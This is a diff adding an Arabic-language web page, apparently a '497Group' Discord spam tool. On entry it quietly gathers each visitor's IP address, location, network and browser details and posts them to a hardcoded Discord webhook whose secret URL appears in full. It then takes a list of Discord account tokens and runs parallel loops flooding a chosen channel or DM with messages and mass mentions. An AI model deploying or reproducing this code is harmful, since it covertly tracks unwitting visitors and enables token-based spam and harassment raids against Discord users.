@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>497 - خالد</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Cairo', sans-serif;
+      background: url('https://i.imgur.com/8yS9J0e.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: #ff4444;
+      text-align: center;
+      direction: rtl;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 60px auto;
+      background: rgba(0, 0, 0, 0.85);
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 30px #ff000044;
+      border: 2px solid #ff0000;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    input, textarea, button, select {
+      width: 85%;
+      padding: 12px;
+      margin: 12px;
+      font-size: 17px;
+      border: none;
+      border-radius: 10px;
+      outline: none;
+    }
+
+    textarea, input, select {
+      background: #111;
+      color: #fff;
+      border: 1px solid #ff0000;
+    }
+
+    button {
+      background: #ff0000;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    button:hover {
+      background: #cc0000;
+      transform: scale(1.03);
+    }
+
+    pre {
+      background: #000;
+      text-align: left;
+      padding: 15px;
+      border-radius: 8px;
+      max-height: 300px;
+      overflow-y: auto;
+      color: #0f0;
+      font-size: 14px;
+      border: 1px solid #550000;
+    }
+
+    footer {
+      margin-top: 20px;
+      color: #bbb;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container" id="visitorLogger">
+    <h2>أدخل يوزرك في ديسكورد</h2>
+    <input type="text" id="visitorName" placeholder="مثال: khalid#0001">
+    <button id="saveVisitor">دخول</button>
+  </div>
+
+  <div class="container hidden" id="login">
+    <h1>497 -</h1>
+    <textarea id="tokenInput" placeholder="اكتب التوكنات، كل توكن بسطر" rows="6"></textarea>
+    <button id="loginBtn">دخول</button>
+  </div>
+
+  <div class="container hidden" id="main">
+    <h1>🔥 497Group🔥</h1>
+    <input type="text" id="channelId" placeholder="ID روم / خاص / قروب">
+    <input type="text" id="mention" placeholder="اكتب الايديات (مفصولة بفاصلة)">
+    <input type="number" id="delay" placeholder="تأخير بالثواني" value="1" step="0.1">
+    <label for="sendType">نوع الإرسال:</label>
+    <select id="sendType">
+      <option value="random">عشوائي</option>
+      <option value="sequential">منتظم</option>
+    </select>
+    <button id="startBtn">ابدأ الإرسال</button>
+    <button id="stopBtn">إيقاف الإرسال</button>
+    <pre id="logBox"></pre>
+    <footer>Khalid 497©</footer>
+  </div>
+
+  <script type="module">
+    import { messages } from './messages.js';
+
+    const visitorLogger = document.getElementById("visitorLogger");
+    const visitorNameInput = document.getElementById("visitorName");
+    const saveVisitorBtn = document.getElementById("saveVisitor");
+    const loginSection = document.getElementById('login');
+    const mainSection = document.getElementById('main');
+
+    const tokenInput = document.getElementById('tokenInput');
+    const channelInput = document.getElementById('channelId');
+    const mentionInput = document.getElementById('mention');
+    const delayInput = document.getElementById('delay');
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const logBox = document.getElementById('logBox');
+    const sendType = document.getElementById('sendType');
+
+    let tokens = [];
+    let stop = false;
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      const platform = navigator.platform;
+      return `${platform} - ${ua}`;
+    }
+
+    async function getIPData() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await res.json();
+
+        const geo = await fetch(`https://ipapi.co/${ip}/json/`);
+        const geoData = await geo.json();
+
+        return {
+          ip,
+          country: geoData.country_name || "غير معروف",
+          city: geoData.city || "غير معروف",
+          org: geoData.org || "غير معروف"
+        };
+      } catch {
+        return { ip: "غير معروف", country: "غير معروف", city: "غير معروف", org: "غير معروف" };
+      }
+    }
+
+    async function sendToWebhook(data) {
+      const webhookUrl = "https://discord.com/api/webhooks/1386470537085059153/zUcSN5MwxToctjyWqAmF4TJuJHVqtJkTgRXW0WCkxRaK34Xh98rGtHzENTGePMzdcD96";
+      const embed = {
+        title: "📥 زائر جديد دخل الموقع",
+        color: 16711680,
+        fields: [
+          { name: "👤 الاسم", value: data.name, inline: true },
+          { name: "🌍 الدولة", value: `${data.country} - ${data.city}`, inline: true },
+          { name: "🌐 IP", value: data.ip, inline: false },
+          { name: "🏢 الشبكة", value: data.org, inline: false },
+          { name: "🕹 الجهاز والمتصفح", value: data.device, inline: false },
+          { name: "⏰ الوقت", value: data.time, inline: false }
+        ]
+      };
+
+      await fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] })
+      });
+    }
+
+    saveVisitorBtn.onclick = async () => {
+      const name = visitorNameInput.value.trim();
+      if (!name) return alert("اكتب يوزرك");
+
+      const device = getDeviceInfo();
+      const ipInfo = await getIPData();
+      const now = new Date().toLocaleString("ar");
+
+      const log = {
+        name,
+        ...ipInfo,
+        device,
+        time: now
+      };
+
+      await sendToWebhook(log);
+
+      visitorLogger.classList.add("hidden");
+      loginSection.classList.remove("hidden");
+    };
+
+    document.getElementById('loginBtn').onclick = () => {
+      tokens = tokenInput.value.trim().split('\\n').map(t => t.trim()).filter(t => t);
+      if (tokens.length === 0) return alert('اكتب التوكنات');
+      loginSection.classList.add('hidden');
+      mainSection.classList.remove('hidden');
+    };
+
+    function getRandomMessage() {
+      const index = Math.floor(Math.random() * messages.length);
+      return messages[index];
+    }
+
+    function getSequentialMessage(index) {
+      return messages[index % messages.length];
+    }
+
+    async function sendMessage(token, channelId, content) {
+      const url = `https://discord.com/api/v9/channels/${channelId}/messages`;
+      const data = { content };
+      const res = await fetch(url, {
+        method: "POST",
+        headers: {
+          "Authorization": token,
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      });
+
+      const txt = await res.text();
+      if (res.ok) {
+        logBox.innerText += `✅ ${token.slice(0, 10)}...: ${content}\\n`;
+      } else {
+        logBox.innerText += `❌ ${token.slice(0, 10)}...: ${res.status} - ${txt}\\n`;
+      }
+    }
+
+    startBtn.onclick = async () => {
+      const channelId = channelInput.value.trim();
+      const mentions = mentionInput.value.split(',').map(id => `<@${id.trim()}>`).join(' ');
+      const delay = parseFloat(delayInput.value) * 1000;
+      const type = sendType.value;
+
+      if (!channelId) return alert("اكتب ID الروم");
+
+      stop = false;
+
+      async function loopSend(token) {
+        let index = 0;
+        while (!stop) {
+          let msg;
+          if (type === "random") {
+            msg = `${getRandomMessage()} ${mentions}`.trim();
+          } else {
+            msg = `${getSequentialMessage(index)} ${mentions}`.trim();
+            index++;
+          }
+          await sendMessage(token, channelId, msg);
+          await new Promise(r => setTimeout(r, delay));
+        }
+      }
+
+      tokens.forEach(token => loopSend(token));
+      logBox.innerText += `🚀 بدأ الإرسال باستخدام ${tokens.length} توكن.\\n`;
+    };
+
+    stopBtn.onclick = () => {
+      stop = true;
+      logBox.innerText += `⛔ تم إيقاف الإرسال.\\n`;
+    };
+  </script>
+</body>
+</html>
